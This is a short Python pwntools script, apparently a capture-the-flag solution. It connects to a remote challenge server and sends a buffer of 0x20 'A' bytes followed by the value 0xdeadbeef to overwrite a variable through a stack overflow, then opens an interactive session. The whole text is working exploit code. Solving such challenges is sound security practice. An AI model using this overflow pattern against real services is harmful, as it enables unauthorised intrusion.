from pwn import *

p = remote('challs.xmas.htsp.ro',2008)
v5 = 0xdeadbeef
payload = "A"*0x20
payload += p64(v5)

p.recvuntil("Hi there. Do I recognize you?\n")
p.sendline(payload)
p.interactive()
